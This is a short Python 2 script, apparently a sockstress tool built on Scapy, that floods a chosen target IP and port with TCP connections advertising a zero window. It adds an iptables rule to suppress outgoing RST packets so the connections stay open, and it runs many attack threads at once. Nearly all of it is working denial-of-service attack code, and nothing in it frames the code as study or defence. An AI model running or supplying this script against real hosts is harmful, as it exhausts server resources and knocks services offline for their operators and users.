#!/usr/bin/python
#coding=utf-8
import os
import signal
import sys
from time import sleep
from scapy.all import *
import logging 
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


if len(sys.argv) !=4:
	print "./sockstress.py [targetIP] [targetPort] [threadCount]"
	sys.exit()

target = str(sys.argv[1])
port = int(sys.argv[2])
threads = int(sys.argv[3])

##攻击函数
def sockstress(target,port):
    while 1:
        try:
            x = random.randint(0,65535)
            res = sr1(IP(dst=target)/TCP(sport=x,dport=port,flags='S'),timeout=1,verbose=0)
            send(IP(dst=target)/TCP(dport=port,sport=x,flags='A',window=0,ack=(res[TCP].seq+1))/'\x00\x00',verbose=0)
        except:
            pass

## 停止攻击函数
def stopAttack(signal,frame):
    print("恢复iptables...")
    os.system('iptables -D OUTPUT -p tcp --tcp-flags RST RST -d '+target+  ' -j DROP') 
    sys.exit()
##添加iptabls规则
os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ' + target + ' -j DROP')
## 注册signal.SIGINT——处理ctrl+c的函数
signal.signal(signal.SIGINT,stopAttack)

print "开时发送数据..."
##多线程sockstress
for i in range(0,threads):
    thread.start_new_thread(sockstress,(target,port))
while 1:
    sleep(1)



